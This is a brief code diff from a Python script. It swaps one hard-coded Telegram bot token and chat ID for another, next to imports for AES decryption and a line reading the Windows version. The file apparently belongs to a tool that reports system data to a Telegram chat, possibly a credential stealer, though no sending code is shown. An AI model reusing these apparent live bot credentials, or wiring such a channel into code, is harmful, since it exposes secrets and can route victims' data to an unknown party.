@@ -9,8 +9,8 @@ from Crypto.Util.Padding import unpad
 from base64 import b64decode
 import hmac,platform
 
-apibot1='6582117676:AAFZYjhQSQhNZNuHjv_8ha1IBeTiUxl_fqA'
-id1='-1001903904391'
+apibot1='6387413160:AAHKA1MeGSFH4mrRl260aVJK2PmF0VM5G84'
+id1='-4075567899'
 
 
 windows_version = platform.platform()
